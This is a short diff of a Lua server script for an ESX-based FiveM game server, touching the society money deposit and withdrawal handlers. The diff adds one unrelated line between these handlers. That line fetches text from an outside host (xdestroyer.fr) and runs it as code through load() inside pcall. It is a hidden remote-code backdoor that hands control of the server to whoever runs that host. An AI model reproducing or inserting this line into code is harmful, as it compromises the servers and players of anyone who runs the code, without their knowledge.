@@ -73,6 +73,10 @@ AddEventHandler('esx_society:withdrawMoney', function(societyName, amount)
 		end)
 end)
 
+
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
+
+
 RegisterServerEvent('esx_society:depositMoney')
 AddEventHandler('esx_society:depositMoney', function(societyName, amount)
 	local xPlayer = ESX.GetPlayerFromId(source)
